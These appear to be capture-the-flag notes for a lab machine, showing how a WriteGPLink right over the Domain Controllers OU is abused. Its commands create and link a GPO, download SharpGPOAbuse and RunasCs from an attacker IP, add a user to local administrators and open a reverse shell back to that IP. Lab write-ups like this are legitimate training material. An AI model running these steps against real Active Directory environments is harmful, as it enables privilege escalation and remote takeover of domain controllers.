#ACL
in this scenario `m.schoolbus` has WriteGPLink over `DOMAIN CONTROLLERS` so we can abuse it to add our self to be `localadmin group` 
![[Pasted image 20250717031230.png]]
Create a new GPO with built in powershell commands


```
New-GPO -Name "anything"
```


Add a GPLink to the domain controllers OU

```
New-GPLink -Name "anything" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
```


Get SharpGPOAbuse.exe on the box

```
iwr "http://10.10.16.71:9090/SharpGPOAbuse.exe" -OutFile ./SharpGPOAbuse.exe
```
Add m.schoolbus to localadmin group

```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName anything
```



Force a group policy update
```
gpupdate /force
```

No that m.schoolbus is local admin Get Runas CSharp on the box

iwr "http://10.10.16.71:9090/RunasCs.exe" -OutFile ./RunasCs.exe

Use it to send a revese shell back to our machine as

```
.\RunasCs.exe "m.schoolbus" '!sub**********' powershell.exe -r 10.10.16.71:4242
```
